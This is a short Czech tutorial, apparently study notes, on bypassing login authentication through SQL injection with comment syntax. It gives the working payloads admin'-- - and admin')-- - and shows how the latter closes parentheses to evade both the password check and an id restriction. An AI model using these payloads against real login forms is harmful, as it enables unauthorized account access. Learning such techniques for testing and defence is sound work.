## 🔑 Obcházení autentizace pomocí komentářů

### 1. Základní Auth Bypass (`admin'-- -`)

Pokud do pole **Username** vložíme `admin'-- -` (a heslo libovolné):

SQL

```
SELECT * FROM logins WHERE username='admin'-- ' AND password = 'something';
```

#### Výsledek:

Vše za znakem `--` se stane komentářem a databáze to ignoruje. Dotaz se reálně vykoná pouze jako:

SQL

```
SELECT * FROM logins WHERE username='admin';
```

Aplikace ověří existenci uživatele `admin` a přihlásí nás bez kontroly hesla.

## 🧩 Pokročilý příklad: Řešení závorek v SQL dotazech

Pokud aplikace používá komplexnější strukturu dotazu se závorkami a např. zakazuje přihlášení administrátora (`id > 1`):

SQL

```
SELECT * FROM logins WHERE (username='admin' AND id > 1) AND password = 'md5_hash';
```

### Chyba při nevhodné injekci:

Zadání samotného `admin'-- -` vyvolá syntaktickou chybu:

SQL

```
SELECT * FROM logins WHERE (username='admin'-- - AND id > 1) ...
-- Chyba: Neuzavřená otevírací závorka "("
```

### 🛠️ Správný Payload: `admin')-- -`

Aby byl dotaz syntakticky správný, musíme otevírací závorku manuálně uzavřít ještě před komentářem:

SQL

```
SELECT * FROM logins WHERE (username='admin')-- - AND id > 1) AND password = 'md5_hash';
```

#### Reálně vykonaný dotaz:

SQL

```
SELECT * FROM logins WHERE (username='admin');
```

Tím úspěšně obejdeme jak kontrolu hesla, tak podmínku `id > 1` a přihlásíme se jako uživatel `admin`.